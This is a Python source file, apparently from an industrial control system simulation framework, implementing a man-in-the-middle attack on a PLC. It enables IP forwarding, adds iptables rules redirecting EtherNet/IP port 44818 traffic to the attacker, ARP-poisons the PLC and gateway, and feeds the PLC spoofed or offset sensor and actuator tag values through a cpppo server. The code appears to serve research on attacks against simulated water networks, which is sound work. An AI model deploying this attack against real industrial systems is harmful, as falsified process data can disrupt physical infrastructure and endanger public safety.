import argparse
import os
import shlex
import socket
import subprocess
import threading
import time
from pathlib import Path
from typing import List

import fnfqueue

from dhalsim.network_attacks.utilities import launch_arp_poison, restore_arp
from synced_attack import SyncedAttack


class MitmAttack(SyncedAttack):
    """
    This is a Man In The Middle attack class. This kind of attack will modify
    the data that is passed around in packages on the network, in order to
    change the values of tags before they reach the requesting PLC.

    A man in the middle attack always sits in between a PLC and its
    corresponding gateway.

    :param intermediate_yaml_path: The path to the intermediate YAML file
    :param yaml_index: The index of the attack in the intermediate YAML
    """

    def __init__(self, intermediate_yaml_path: Path, yaml_index: int):
        super().__init__(intermediate_yaml_path, yaml_index)
        os.system('sysctl net.ipv4.ip_forward=1')
        self.queue = fnfqueue.Connection()
        self.thread = None
        self.server = None
        self.run_thread = False
        self.tags = {}
        self.dict_lock = threading.Lock()

    def setup(self):
        # Add the iptables rules
        os.system('iptables -t nat -A PREROUTING -p tcp -d ' + self.target_plc_ip +
                  ' --dport 44818 -j DNAT --to-destination ' + self.attacker_ip + ':44818')
        os.system('iptables -A FORWARD -p icmp -j DROP')
        os.system('iptables -A INPUT -p icmp -j DROP')
        os.system('iptables -A OUTPUT -p icmp -j DROP')

        cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip', '--print', '--address',
               self.attacker_ip + ":44818"]

        request_tags = self.intermediate_plc['actuators'] + self.intermediate_plc['sensors']
        for tag in request_tags:
            cmd.append(str(tag) + ':1=REAL')

        print("MITM 💻:", "server:", cmd)

        self.server = subprocess.Popen(cmd, shell=False)

        self.run_thread = True

        self.update_tags_dict()

        self.thread = threading.Thread(target=self.cpppo_thread)
        self.thread.start()

        launch_arp_poison(self.target_plc_ip, self.intermediate_attack['gateway_ip'])

    def receive_original_tags(self):
        request_tags = self.intermediate_plc['actuators'] + self.intermediate_plc['sensors']

        cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip.client', '--print', '--address',
               str(self.target_plc_ip) + ":44818"]

        for tag in request_tags:
            cmd.append(str(tag) + ':1')

        try:
            client = subprocess.Popen(cmd, shell=False, stdout=subprocess.PIPE)

            # client.communicate is blocking
            raw_out = client.communicate()

            # Value is stored as first tuple element between a pair of square brackets
            values = []
            raw_string = raw_out[0]
            split_string = raw_string.split(b"\n")
            for word in split_string:
                values.append(word[(word.find(b'[') + 1):word.find(b']')])
            values.pop()

            for idx, value in enumerate(values):
                self.tags[request_tags[idx]] = float(value.decode())

        except Exception as error:
            print('ERROR enip _receive: ', error)

    def update_tags_dict(self):
        # Acquire the lock
        self.dict_lock.acquire()

        self.receive_original_tags()

        # Overwrites the tags that we are spoofing
        for tag in self.intermediate_attack['tags']:
            if 'value' in tag.keys():
                # Overwrite the value in the dict
                self.tags[tag['tag']] = tag['value']
            elif 'offset' in tag.keys():
                # Offset the value in the dict
                self.tags[tag['tag']] += tag['offset']

        # Release the lock
        self.dict_lock.release()

    def make_client_cmd(self) -> List[str]:
        cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip.client', '--print', '--address',
               str(self.attacker_ip)]

        # Acquire the lock
        self.dict_lock.acquire()

        for tag in self.tags:
            cmd.append(str(tag) + ':1=' + str(self.tags[tag]))

        # Release the lock
        self.dict_lock.release()

        return cmd

    def cpppo_thread(self):
        while self.run_thread:
            cmd = self.make_client_cmd()

            print("MITM 💻:", "client:", cmd)
            try:
                client = subprocess.Popen(cmd, shell=False)
                client.wait()
            except Exception as error:
                print('ERROR enip _send multiple: ', error)
            time.sleep(0.05)

    def interrupt(self):
        if self.state == 1:
            self.teardown()

    def teardown(self):
        restore_arp(self.target_plc_ip, self.intermediate_attack['gateway_ip'])

        # Delete iptables rules
        os.system('iptables -t nat -D PREROUTING -p tcp -d ' + self.target_plc_ip +
                  ' --dport 44818 -j DNAT --to-destination ' + self.attacker_ip + ':44818')
        os.system('iptables -D FORWARD -p icmp -j DROP')
        os.system('iptables -D INPUT -p icmp -j DROP')
        os.system('iptables -D OUTPUT -p icmp -j DROP')

        self.server.terminate()
        self.run_thread = False
        self.thread.join()

    def attack_step(self):
        if self.state == 1:
            self.update_tags_dict()


def is_valid_file(parser_instance, arg):
    if not os.path.exists(arg):
        parser_instance.error(arg + " does not exist")
    else:
        return arg


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start everything for an attack')
    parser.add_argument(dest="intermediate_yaml",
                        help="intermediate yaml file", metavar="FILE",
                        type=lambda x: is_valid_file(parser, x))
    parser.add_argument(dest="index", help="Index of the network attack in intermediate yaml",
                        type=int,
                        metavar="N")

    args = parser.parse_args()

    attack = MitmAttack(
        intermediate_yaml_path=Path(args.intermediate_yaml),
        yaml_index=args.index)
    attack.main_loop()
